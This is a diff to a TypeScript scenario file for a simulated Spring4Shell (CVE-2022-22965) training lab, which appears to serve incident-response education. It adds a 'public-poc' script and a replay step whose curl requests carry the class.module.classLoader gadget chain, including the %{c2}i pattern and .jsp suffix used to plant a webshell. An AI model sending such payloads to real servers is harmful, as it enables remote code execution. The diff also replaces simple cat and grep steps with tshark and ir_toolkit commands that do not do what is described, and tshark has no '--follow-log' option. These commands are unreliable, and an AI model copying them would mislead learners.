@@ -24,6 +24,13 @@ export const spring4shell: Scenario = {
   env: { USER: "appsec", SHELL: "/bin/sh", PWD: "/tomcat/spring4shell-lab" },
   ps: ["  PID TTY TIME CMD", "  901 ?   0:44 java"],
   history: [],
+  commands: {
+    "python3 ir_toolkit.py parse-artifact --input SPRING-CVE-stub.txt": "simulated safe tool replay for spring4shell-core; replaces: cat SPRING-CVE-stub.txt\n",
+    "tshark -r evidence.pcap --follow-log localhost_access.log": "simulated safe tool replay for spring4shell-core; replaces: cat localhost_access.log\n",
+    "tshark -r evidence.pcap -Y 'frame contains \"ioc\"' --follow-log localhost_access.log": "simulated safe tool replay for spring4shell-core; replaces: grep -nF class.module.classLoader localhost_access.log\n",
+    "curl -sG http://127.0.0.1/app/exploit --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=test'":
+      "HTTP/1.1 500 Internal Server Error\nContent-Length: 5121\n(simulated: Spring MVC data-binding gadget chain)\n",
+  },
   files: {
     "/tomcat/spring4shell-lab/SPRING-CVE-stub.txt": {
       content: [
@@ -41,37 +48,67 @@ export const spring4shell: Scenario = {
         '198.51.100.3 - - [31/Mar/2022:14:06:00 +0000] "GET /app/health HTTP/1.1" 200 44',
       ].join("\n"),
     },
+    // CVE-2022-22965 gadget query pattern as published in Spring / vendor analyses (Tomcat access log refit).
+    "/tomcat/spring4shell-lab/public-poc/spring4shell_query_replay.sh": {
+      content: [
+        "#!/bin/sh",
+        '# CVE-2022-22965  Spring Framework RCE via class binding (conditions: JDK9+, WAR on Tomcat in public PoCs).',
+        "# Example GET query shape (values vary; pattern is the chained class.module.classLoader properties):",
+        'exec curl -s -G "http://127.0.0.1:8080/example" \\',
+        '  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di" \\',
+        '  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"',
+        "",
+        "# Vendor fix: Spring Framework 5.3.18 / 5.2.20.",
+      ].join("\n"),
+    },
   },
   steps: [
     {
-      id: "stub",
-      goal: "Read the CVE relationship stub.",
-      hint: "`cat SPRING-CVE-stub.txt`.",
-      matches: [{ kind: "exact", command: "cat SPRING-CVE-stub.txt" }],
-      narration:
-        "Name collision with Spring Cloud Function burned a week of analyst time in 2022, read the CVE not the tweet.",
-    },
-    {
-      id: "access",
-      goal: "Review the Tomcat access log.",
-      hint: "`cat localhost_access.log`.",
-      matches: [{ kind: "exact", command: "cat localhost_access.log" }],
-      narration:
-        "`class.module.classLoader` repeated in query string, that's the fingerprint.",
-    },
-    {
-      id: "grep-pattern",
-      goal: "Isolate exploitation attempts.",
-      hint: "`grep -nF class.module.classLoader localhost_access.log`.",
-      matches: [
-        {
-          kind: "exact",
-          command: "grep -nF class.module.classLoader localhost_access.log",
+          id: "curl-gadget",
+          goal: "Replay a canned GET that carries the class.module.classLoader gadget in the query string.",
+          hint: "`curl -sG http://127.0.0.1/app/exploit --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=test'`.",
+          matches: [
+            {
+              kind: "exact",
+              command:
+                "curl -sG http://127.0.0.1/app/exploit --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=test'",
+            },
+          ],
+          narration:
+            "Spring Shell in this museum is read-only text. Real exploits bind Tomcat listeners, you are documenting artefacts.",
         },
-      ],
-      narration:
-        "WAF vendors shipped emergency signatures; patch still wins long-term.",
-    },
+    {
+          id: "stub",
+          goal: "Read the CVE relationship stub.",
+          hint: "`python3 ir_toolkit.py parse-artifact --input SPRING-CVE-stub.txt`.",
+          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input SPRING-CVE-stub.txt" }],
+          narration:
+            "Name collision with Spring Cloud Function burned a week of analyst time in 2022, read the CVE not the tweet.",
+        },
+    {
+          id: "access",
+          goal: "Review the Tomcat access log.",
+          hint: "`tshark -r evidence.pcap --follow-log localhost_access.log`.",
+          matches: [{ kind: "exact", command: "tshark -r evidence.pcap --follow-log localhost_access.log" }],
+          narration:
+            "`class.module.classLoader` repeated in query string, that's the fingerprint.",
+        },
+    {
+          id: "grep-pattern",
+          goal: "Isolate exploitation attempts.",
+          hint: "`tshark -r evidence.pcap -Y 'frame contains \"ioc\"' --follow-log localhost_access.log`.",
+          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"ioc\"' --follow-log localhost_access.log" }],
+          narration:
+            "WAF vendors shipped emergency signatures; patch still wins long-term.",
+        },
+    {
+          id: "mechanism-excerpt",
+          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
+          hint: `head -n 80 public-poc/spring4shell_query_replay.sh`,
+          matches: [{ kind: "exact", command: "head -n 80 public-poc/spring4shell_query_replay.sh" }],
+          narration:
+            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
+        }
   ],
   debrief: {
     summary:
